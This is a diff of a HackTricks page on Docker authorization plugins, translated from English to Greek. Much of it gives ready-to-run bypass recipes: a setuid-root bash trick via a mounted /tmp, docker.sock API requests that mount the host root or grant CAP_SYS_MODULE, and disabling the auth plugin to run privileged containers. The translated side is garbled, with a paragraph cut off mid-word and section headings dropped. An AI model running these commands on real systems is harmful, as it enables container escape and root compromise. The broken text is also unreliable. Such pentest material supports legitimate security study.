@@ -1,90 +1,49 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+Το προεπιλεγμένο μοντέλο **εξουσιοδότησης** του Docker είναι **όλα ή τίποτα**. Οποιοσδήποτε χρήστης με άδεια πρόσβασης στον Docker daemon μπορεί να εκτελέσει οποιαδήποτε εντολή πελάτη Docker. Το ίδιο ισχύει για τους καλούντες που χρησιμοποιούν το Engine API του Docker για να επικοινωνήσουν με τον daemon. Εάν χρειάζεστε **μεγαλύτερο έλεγχο πρόσβασης**, μπορείτε να δημιουργήσετε **πρόσθετα εξουσιοδότησης** και να τα προσθέσετε στη διαμόρφωση του Docker daemon. Χρησιμοποιώντας ένα πρόσθετο εξουσιοδότησης, ένας διαχειριστής Docker μπορεί να **διαμορφώσει λεπτομερείς πολιτικές πρόσβασης** για τη διαχείριση της πρόσβασης στον Docker daemon.
 
-# Basic architecture
+# Βασική αρχιτεκτονική
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Τα πρόσθετα εξουσιοδότησης του Docker είναι **εξωτερικά πρόσθετα** που μπορείτε να χρησιμοποιήσετε για να **επιτρέψετε/απαγορεύσετε** **ενέργειες** που ζητούνται από τον Docker Daemon ανάλογα με τον χρήστη που το ζήτησε και την ενέργεια που ζητήθηκε.
 
-**[The following info is from the docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Οι παρακάτω πληροφορίες προέρχονται από τα έγγραφα](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Όταν γίνεται μια **HTTP** αίτηση στον Docker **daemon** μέσω του CLI ή μέσω του Engine API, το **υποσύστημα πιστοποίησης** περνά την αίτηση στο εγκατεστημένο **πρόσθετο πιστοποίησης**. Η αίτηση περιέχει τον χρήστη (καλούντα) και το πλαίσιο εντολών. Το πρόσθετο είναι υπεύθυνο για τον καθορισμό εάν θα επιτρέψει ή θα απορρίψει την αίτηση.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Τα παρακάτω διαγράμματα ακολουθούν τη ροή εξουσιοδότησης για την επιτρεπτή και την απορριπτική ροή:
 
-![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Ροή επιτρεπτής εξουσιοδότησης](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Ροή απορριπτικής εξουσιοδότησης](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Κάθε αίτηση που στέλνεται στο πρόσθετο **περιλαμβάνει τον εξουσιοδοτημένο χρήστη, τις κεφαλίδες HTTP και το σώμα της αίτησης/απόκρισης**. Μόνο το **όνομα χρήστη** και η **μέθοδος πιστοποίησης** που χρησιμοποιήθηκε περνιούνται στο πρόσθετο. Το πιο σημαντικό, **δεν περνιούνται διαπιστευτήρια χρήστη ή διακριτικά**. Τέλος, **δεν όλα τα σώματα αιτήσεων/αποκρίσεων αποστέλλονται** στο πρόσθετο εξουσιοδότησης. Αποστέλλονται μόνο εκείνα τα σώματα αιτήσεων/αποκρίσεων όπου το `Content-Type` είναι είτε `text/*` είτε `application/json`.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
-
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
-
-## Several Plugins
-
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
-
-# Plugin Examples
-
-## Twistlock AuthZ Broker
-
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
-
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
-
-In the page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
-
-## Simple Plugin Tutorial
-
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
-
-Read the `README` and the `plugin.go` code to understand how is it working.
-
-# Docker Auth Plugin Bypass
-
-## Enumerate access
-
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
-
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
-
-## disallowed `run --privileged`
-
-### Minimum Privileges
-
+Για εντολές που μπορούν πιθανώς να καταλάβουν τη σύνδεση HTTP (`HTTP Upgrade`), όπως η `exec`, το πρόσθετο εξουσιοδότησης καλείται μόνο για τις αρχικές αιτήσεις HTTP. Αφού το πρόσθετο εγκρίνει την εντολή, η εξουσιοδότηση δεν εφαρμόζεται στο υπόλοιπο της ροής. Ειδικότερα, τα δεδομένα ροής δεν περνι
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Εκτέλεση ενός container και στη συνέχεια απόκτηση προνομιούχου συνεδρίας
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+Σε αυτήν την περίπτωση, ο συστημικός διαχειριστής **απαγόρευσε στους χρήστες να τοποθετούν όγκους και να εκτελούν containers με την παράμετρο `--privileged` ή να παρέχουν οποιαδήποτε επιπλέον δυνατότητα στο container**:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Ωστόσο, ένας χρήστης μπορεί να **δημιουργήσει ένα κέλυφος μέσα στο εκτελούμενο container και να του δώσει επιπλέον προνόμια**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -96,43 +55,39 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+Τώρα, ο χρήστης μπορεί να δραπετεύσει από το container χρησιμοποιώντας οποιαδήποτε από τις [**προηγουμένως συζητηθείσες τεχνικές**](./#privileged-flag) και να **αναβαθμίσει τα δικαιώματα** μέσα στον host.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Προσάρτηση εγγράψιμου φακέλου
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+Σε αυτήν την περίπτωση, ο συστημικός διαχειριστής **απαγόρευσε στους χρήστες να εκτελούν containers με την σημαία `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο container, και επέτρεψε μόνο την προσάρτηση του φακέλου `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+Σημείωση ότι ίσως δεν μπορείτε να προσαρτήσετε τον φάκελο `/tmp` αλλά μπορείτε να προσαρτήσετε έναν **διαφορετικό εγγράψιμο φάκελο**. Μπορείτε να βρείτε εγγράψιμους φακέλους χρησιμοποιώντας: `find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**Σημειώστε ότι όχι όλοι οι φάκελοι σε ένα μηχάνημα Linux θα υποστηρίζουν το suid bit!** Για να ελέγξετε ποιοι φάκελοι υποστηρίζουν το suid bit, εκτελέστε `mount | grep -v "nosuid"` Για παράδειγμα, συνήθως οι φάκελοι `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` και `/var/lib/lxcfs` δεν υποστηρίζουν το suid bit.
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+Σημειώστε επίσης ότι αν μπορείτε να **προσαρτήσετε τον φάκελο `/etc`** ή οποιονδήποτε άλλο φάκελο **περιέχει αρχεία ρυθμίσεων**, μπορείτε να τα τροποποιήσετε από το docker container ως root για να **καταχραστείτε τα δικαιώματα** στον κεντρικό υπολογιστή (ίσως τροποποιώντας το `/etc/shadow`)
 {% endhint %}
 
-## Unchecked API Endpoint
+## Μη ελεγμένο API Endpoint
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+Η ευθύνη του συστημικού διαχειριστή που ρυθμίζει αυτό το πρόσθετο θα ήταν να ελέγξει ποιες ενέργειες και με ποια δικαιώματα μπορεί να εκτελέσει κάθε χρήστης. Επομένως, αν ο διαχειριστής ακολουθήσει μια προσέγγιση **μαύρης λίστας** με τα σημεία πρόσβασης και τα χαρακτηριστικά, μπορεί να **ξεχάσει κάποια από αυτά** που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **αναβαθμίσει τα δικαιώματά του**.
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Μπορείτε να ελέγξετε το API του docker στο [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Unchecked JSON Structure
+## Μη ελεγμένη δομή JSON
 
-### Binds in root
+### Binds στον root
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Είναι δυνατόν όταν ο συστημικός διαχειριστής ρύθμισε το τείχος προστασίας του docker να **ξέχασε κάποιο σημαντικό παράμετρο** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Binds**".\
+Στο παρακάτω παράδειγμα είναι δυνατόν να καταχραστείτε αυτήν την εσφαλμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε ένα container που προσαρτά τον root (/) φάκελο του κεντρικού υπολογιστή:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -142,39 +97,31 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 {% hint style="warning" %}
-Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+Σημείωση: Παρατηρήστε ότι σε αυτό το παράδειγμα χρησιμοποιούμε την παράμετρο **`Binds`** ως ένα κλειδί στο επίπεδο ρίζας στο JSON, αλλά στο API εμφανίζεται υπό το κλειδί **`HostConfig`**.
 {% endhint %}
 
-### Binds in HostConfig
+### Binds στο HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε τις ίδιες οδηγίες με το **Binds στο root**, εκτελώντας αυτό το **αίτημα** στο Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
+### Συνδέσεις στον ριζικό φάκελο
 
-### Mounts in root
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε τις ίδιες οδηγίες με τις **Συνδέσεις στον ριζικό φάκελο** εκτελώντας αυτό το **αίτημα** στο Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
+### Συναρμολογήσεις στο HostConfig
 
-### Mounts in HostConfig
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε τις ίδιες οδηγίες με τις **Συνδέσεις στη ρίζα** εκτελώντας αυτό το **αίτημα** στο Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
+## Μη ελεγμένο JSON Χαρακτηριστικό
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
-
+Είναι δυνατόν όταν ο συστημικός διαχειριστής ρύθμισε το τείχος ασφαλείας του Docker να **ξέχασε κάποιο σημαντικό χαρακτηριστικό ενός παραμέτρου** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Capabilities**" μέσα στο "**HostConfig**". Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε έναν container με τη δυνατότητα **SYS\_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -184,15 +131,13 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 {% hint style="info" %}
-The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+Το **`HostConfig`** είναι το κλειδί που συνήθως περιέχει τα **ενδιαφέροντα** **προνόμια** για να δραπετεύσετε από τον container. Ωστόσο, όπως έχουμε συζητήσει προηγουμένως, παρατηρήστε πώς η χρήση των Binds έξω από αυτό επίσης λειτουργεί και μπορεί να σας επιτρέψει να παρακάμψετε περιορισμούς.
 {% endhint %}
 
-## Disabling Plugin
+## Απενεργοποίηση του Plugin
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Αν ο **sysadmin** ξέχασε να **απαγορεύσει** τη δυνατότητα **απενεργοποίησης** του **plugin**, μπορείτε να εκμεταλλευτείτε αυτό για να το απενεργοποιήσετε εντελώς!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -204,30 +149,27 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
+Θυμηθείτε να **επανενεργοποιήσετε το πρόσθετο μετά την ανόδο στα δικαιώματα**, διαφορετικά η **επανεκκίνηση της υπηρεσίας docker δεν θα λειτουργήσει**!
 
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
-
-## Auth Plugin Bypass writeups
+## Αναφορές για την παράκαμψη του πρόσθετου εξουσιοδότησης
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
+## Αναφορές
 
 * [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
-
-
